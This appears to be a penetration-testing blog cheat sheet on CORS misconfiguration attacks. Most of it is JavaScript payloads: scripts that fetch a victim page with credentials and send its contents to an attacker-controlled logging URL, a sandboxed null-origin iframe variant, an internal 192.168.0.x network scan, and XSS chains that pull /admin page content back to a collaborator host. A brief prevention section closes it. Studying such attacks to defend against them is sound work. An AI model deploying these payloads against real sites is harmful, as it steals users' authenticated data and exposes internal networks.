---
title: "CORS attack"
subtitle: ""
date: 2020-03-04T15:58:26+08:00
lastmod: 2020-03-04T15:58:26+08:00
draft: false
author: "Hato0"
description: "CORS cheatsheet"

tags: ["web", "penetest", "cors"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# Cross-origin resource sharing

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.  It can provide an attack vector to cross-domain based attacks, if a website's CORS policy is poorly configured and implemented. 

To check for the Access-Control-Allow-Origin value you can send a request including the following header:
`Origin: WEBSITE`

The presence of Access-Control-Allow-Credentials is a good indicator of potential CORS.

## Some examples

- Basic origin reflection

	On your website you can place a script looking like this one : 
	
	{{< highlight javascript "lineNos=false" >}}
	<script>  
	 var req = new XMLHttpRequest();  
	 req.onload = reqListener;  
	 req.open('get','FULL_URL_TO_TARGET',true);  
	 req.withCredentials = true;  
	 req.send();  

	 function reqListener() {  
	 location='/log?key='+this.responseText;  
	 };  
	</script>
    {{< /highlight >}}
	 
	 This script will fetch the FULL_URL_TO_TARGET page using the Access-Control-Allow-Credentials header. Then when the page will be loaded, it will take the page data  and send it back to you on your website.
	 
	 
- Trusted null origin

	Basicly this is the same as the previous one, just include the ifram with sandbox options:
	`sandbox="allow-scripts allow-top-navigation allow-forms"`

	{{< highlight javascript "lineNos=false" >}}
	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>  
	 var req = new XMLHttpRequest ();  
	 req.onload = reqListener;  
	 req.open('get','FULL_URL_TO_TARGET',true);  
	 req.withCredentials = true;  
	 req.send();  

	 function reqListener() {  
	 location='YOUR_WEBSITE/log?key='+encodeURIComponent(this.responseText);  
	 };  
	</script>"></iframe>
	{{< /highlight >}}
	
	
- Internal network pivot attack

	This one is the trickier, it will follow these steps:
	
	1. Scan for endpoint in the internal network, it will fetch a XSS on the scanned page, your website log should include port and the corresponding IP.
	
		{{< highlight javascript "lineNos=false" >}}
		<script>
		var q = [], collaboratorURL = 'YOURWEBSITE';
		for(i=1;i<=255;i++){
		  q.push(
		  function(url){
			return function(wait){
			fetchUrl(url,wait);
			}
		  }('http://192.168.0.'+i+':8080'));
		}
		for(i=1;i<=20;i++){
		  if(q.length)q.shift()(i*100);
		}
		function fetchUrl(url, wait){
		  var controller = new AbortController(), signal = controller.signal;
		  fetch(url, {signal}).then(r=>r.text().then(text=>
			{
			location = collaboratorURL + '?IP='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
		  }
		  ))
		  .catch(e => {
		  if(q.length) {
			q.shift()(wait);
		  }
		  });
		  setTimeout(x=>{
		  controller.abort();
		  if(q.length) {
			q.shift()(wait);
		  }
		  }, wait);
		}
		</script>
		{{< /highlight >}}
		
		2. Then you will be able to go for XSS fetching, using information previously retrieve

		{{< highlight javascript "lineNos=false" >}}
		<script>  
		function xss(url, text, vector) {  
		 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="(\[^"\]+)"/)\[1\];  
		}  

		function fetchUrl(url, collaboratorURL){  
		 fetch(url).then(r=>r.text().then(text=>  
		 {  
		 xss(url, text, '"><img src='+collaboratorURL+'?isXSS=1>');  
		 }  
		 ))  
		}  

		fetchUrl("http://IP_FOUND", "YOURWEBSITE");  
		</script>
		{{< /highlight >}}

		3. From the previous step, you will locate a potential XSS, if you find one it would be display in your website logs using `isXSS=1`. In this part we will go for the XSS exploit and retrieve the web page content.

		{{< highlight javascript "lineNos=false" >}}
		<script>  
		function xss(url, text, vector) {  
		 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="(\[^"\]+)"/)\[1\];  
		}  
		function fetchUrl(url, collaboratorURL){  
		 fetch(url).then(r=>r.text().then(text=>  
		 {  
		 xss(url, text, '"><iframe src=/admin onload="new Image().src=\\''+collaboratorURL+'?code=\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');  
		 }  
		 ))  
		}  

		fetchUrl("http://IP_FOUND", "YOURWEBSITE");    
		</script>
		{{< /highlight >}}
		
		4. Then you are free to do whatever you want, iframe injection, CSRF, ...
	
		
## How to prevent them 

CORS are only present due to misconfigurations, you can use these headers to configure it correctly (and also use your brain again).
- Access-Control-Allow-Origin: 
	- Allow content from listed websites
	- Avoid null value => can be exploit as we see above
	- Avoid local things as you don't protect your colleagues actions
